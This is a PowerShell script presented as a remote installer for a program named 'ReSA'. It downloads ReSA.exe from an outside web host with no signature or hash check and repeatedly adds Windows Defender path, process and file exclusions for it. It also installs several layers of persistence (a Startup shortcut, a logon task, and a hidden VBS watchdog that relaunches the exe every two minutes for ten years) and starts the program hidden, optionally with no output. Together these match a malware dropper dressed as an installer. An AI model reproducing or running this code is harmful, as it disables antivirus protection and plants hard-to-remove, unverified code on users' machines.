# ReSA remote install - ASCII only for PowerShell 5.1 compatibility
param(
    [switch]$Silent
)

$ErrorActionPreference = "Continue"
$scriptPath = $MyInvocation.MyCommand.Path
if ($scriptPath) {
    Unblock-File -LiteralPath $scriptPath -ErrorAction SilentlyContinue
}
$BaseUrl = $env:RESA_INSTALL_BASE
if (-not $BaseUrl) {
    $BaseUrl = "https://olxp.cc/download"
}
$BaseUrl = $BaseUrl.Trim().TrimEnd("/")
if ($BaseUrl -match "\s") {
    $BaseUrl = ($BaseUrl -split "\s+")[0]
}

$Dir = Join-Path $env:LOCALAPPDATA "ReSA"
$Exe = Join-Path $Dir "ReSA.exe"
$Temp = Join-Path $env:TEMP "ReSA-download.exe"
$LogFile = Join-Path $env:TEMP "ReSA-install.log"
$script:HadError = $false

function Write-InstallLog {
    param([string]$Text)
    $line = (Get-Date -Format "yyyy-MM-dd HH:mm:ss") + " " + $Text
    try {
        Add-Content -LiteralPath $LogFile -Value $line -Encoding UTF8
    } catch {
        $null = $_
    }
    if (-not $Silent) {
        Write-Host $Text
    }
}

function Fail-Install {
    param([string]$Text)
    $script:HadError = $true
    Write-InstallLog $Text
    if (-not $Silent) {
        Write-Host $Text -ForegroundColor Red
    }
}

function Download-File {
    param(
        [string]$Url,
        [string]$OutFile
    )

    $ProgressPreference = "SilentlyContinue"
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    } catch {
        $null = $_
    }

    $curl = Join-Path $env:SystemRoot "System32\curl.exe"
    if (Test-Path -LiteralPath $curl) {
        & $curl -fsSL -o $OutFile $Url
        if ($LASTEXITCODE -eq 0 -and (Test-Path -LiteralPath $OutFile)) {
            return
        }
    }

    $iwrArgs = @{
        Uri = $Url
        OutFile = $OutFile
        UseBasicParsing = $true
    }
    if ($PSVersionTable.PSVersion.Major -lt 6) {
        $iwrArgs.UserAgent = "ReSA-Installer/1.0"
    }
    Invoke-WebRequest @iwrArgs
}

function Add-DefenderExclusion {
    param(
        [string]$Path,
        [string]$ExePath
    )

    $ok = $false
    try {
        Add-MpPreference -ExclusionPath $Path -ErrorAction Stop
        Write-InstallLog ("defender path exclusion ok: " + $Path)
        $ok = $true
    } catch {
        Write-InstallLog ("defender path exclusion skipped: " + $_.Exception.Message)
    }

    try {
        Add-MpPreference -ExclusionProcess "ReSA.exe" -ErrorAction Stop
        Write-InstallLog "defender process exclusion ok: ReSA.exe"
        $ok = $true
    } catch {
        Write-InstallLog ("defender process exclusion skipped: " + $_.Exception.Message)
    }

    if ($ExePath -and (Test-Path -LiteralPath $ExePath)) {
        try {
            Add-MpPreference -ExclusionPath $ExePath -ErrorAction Stop
            Write-InstallLog ("defender file exclusion ok: " + $ExePath)
            $ok = $true
        } catch {
            Write-InstallLog ("defender file exclusion skipped: " + $_.Exception.Message)
        }
    }

    return $ok
}

function Register-WatchdogTask {
    param(
        [string]$TaskName,
        [string]$ProcessName,
        [string]$Exe,
        [string]$Dir,
        [string]$UpdateMarker
    )

    $procImage = if ($ProcessName -match '\.exe$') { $ProcessName } else { "$ProcessName.exe" }
    $watchFile = Join-Path $Dir "watchdog.vbs"
    $watchLines = @(
        'Option Explicit'
        'Dim fso, sh, wmi, procs'
        ('Const PROC_NAME = "' + $procImage + '"')
        ('Const EXE_PATH = "' + ($Exe.Replace('"', '""')) + '"')
        ('Const WORK_DIR = "' + ($Dir.Replace('"', '""')) + '"')
        ('Const UPDATE_MARKER = "' + ($UpdateMarker.Replace('"', '""')) + '"')
        'Set fso = CreateObject("Scripting.FileSystemObject")'
        'If fso.FileExists(UPDATE_MARKER) Then WScript.Quit 0'
        'Set wmi = GetObject("winmgmts:\\.\root\cimv2")'
        'Set procs = wmi.ExecQuery("SELECT Name FROM Win32_Process WHERE Name=''" & PROC_NAME & "''")'
        'If procs.Count = 0 Then'
        '  Set sh = CreateObject("Wscript.Shell")'
        '  sh.CurrentDirectory = WORK_DIR'
        '  sh.Run """" & EXE_PATH & """", 0, False'
        'End If'
    )
    Set-Content -LiteralPath $watchFile -Value $watchLines -Encoding ASCII
    Remove-Item -LiteralPath (Join-Path $Dir "watchdog.ps1") -Force -ErrorAction SilentlyContinue

    $taskArgs = "//B //Nologo `"$watchFile`""
    $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument $taskArgs -WorkingDirectory $Dir
    $Trigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(1)) -RepetitionInterval (New-TimeSpan -Minutes 2) -RepetitionDuration (New-TimeSpan -Days 3650)
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Minutes 1) -MultipleInstances IgnoreNew
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Force | Out-Null
}

Write-InstallLog "install start"
Write-InstallLog ("target: " + $Exe)

try {
    New-Item -ItemType Directory -Force -Path $Dir | Out-Null
} catch {
    $null = $_
}

Add-DefenderExclusion -Path $Dir -ExePath $Exe | Out-Null

Get-Process -Name "ReSA" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Start-Sleep -Milliseconds 500

$Url = $BaseUrl + "/ReSA.exe"
Write-InstallLog ("download: " + $Url)

if (Test-Path -LiteralPath $Temp) {
    Remove-Item -LiteralPath $Temp -Force -ErrorAction SilentlyContinue
}

try {
    Download-File -Url $Url -OutFile $Temp
} catch {
    Fail-Install ("download failed: " + $_.Exception.Message)
    exit 1
}

if (-not (Test-Path -LiteralPath $Temp)) {
    Fail-Install "missing file after download"
    exit 1
}

$length = (Get-Item -LiteralPath $Temp).Length
if ($length -lt 1048576) {
    Remove-Item -LiteralPath $Temp -Force -ErrorAction SilentlyContinue
    Fail-Install ("file too small: " + $length + " bytes")
    exit 1
}

if (Test-Path -LiteralPath $Exe) {
    Remove-Item -LiteralPath $Exe -Force -ErrorAction SilentlyContinue
}

try {
    Move-Item -LiteralPath $Temp -Destination $Exe -Force
} catch {
    Fail-Install ("copy failed: " + $_.Exception.Message)
    exit 1
}

Unblock-File -LiteralPath $Exe -ErrorAction SilentlyContinue

Add-DefenderExclusion -Path $Dir -ExePath $Exe | Out-Null

$startupOk = $false
try {
    $Startup = [Environment]::GetFolderPath("Startup")
    $Wsh = New-Object -ComObject WScript.Shell
    $Link = $Wsh.CreateShortcut((Join-Path $Startup "ReSA.lnk"))
    $Link.TargetPath = $Exe
    $Link.WorkingDirectory = $Dir
    $Link.WindowStyle = 7
    $Link.Save()
    $startupOk = $true
    Write-InstallLog "startup shortcut ok"
} catch {
    $null = $_
}

if (-not $startupOk) {
    $Action = New-ScheduledTaskAction -Execute $Exe -WorkingDirectory $Dir
    $Trigger = New-ScheduledTaskTrigger -AtLogOn
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
    Register-ScheduledTask -TaskName "ReSA" -Action $Action -Trigger $Trigger -Settings $Settings -Force | Out-Null
    Write-InstallLog "scheduled task ok"
}

try {
    Register-WatchdogTask -TaskName "ReSA-Watchdog" -ProcessName "ReSA" -Exe $Exe -Dir $Dir -UpdateMarker (Join-Path $Dir "ReSA.new.exe")
    Write-InstallLog "watchdog task ok"
} catch {
    Write-InstallLog ("watchdog task skipped: " + $_.Exception.Message)
}

try {
    Start-Process -FilePath $Exe -WorkingDirectory $Dir -WindowStyle Hidden
    Write-InstallLog "started"
} catch {
    Fail-Install ("start failed: " + $_.Exception.Message)
    exit 1
}

Write-InstallLog "install complete"
exit 0
